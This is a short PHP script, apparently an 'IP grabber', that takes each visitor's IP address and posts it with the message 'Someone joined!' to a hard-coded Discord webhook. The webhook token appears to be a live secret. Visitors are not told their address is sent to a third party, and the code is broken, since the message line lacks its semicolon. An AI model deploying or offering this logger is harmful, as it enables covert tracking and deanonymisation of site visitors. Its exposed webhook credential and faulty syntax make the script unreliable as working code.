<?php
// Get the user's IP address
$user_ip = $_SERVER['REMOTE_ADDR'];

// Discord webhook URL
$webhook_url = 'https://discord.com/api/webhooks/1215341442495684619/EI52nygxr-EO1T3xfIQD2crB5WIMPAA4X8aiPhn_kIr3Fs6M20KGAT-Lk0PrKUYu10sb';

// Create the message
$message = "Someone joined! IP: $user_ip "

// Send the message to Discord
$curl = curl_init($webhook_url);
curl_setopt($curl, CURLOPT_CUSTOMREQUEST, "POST");
curl_setopt($curl, CURLOPT_POSTFIELDS, json_encode(array('content' => $message)));
curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
curl_setopt($curl, CURLOPT_HTTPHEADER, array('Content-Type: application/json'));
$response = curl_exec($curl);
curl_close($curl);

// Return response (optional)
echo $response;
?>
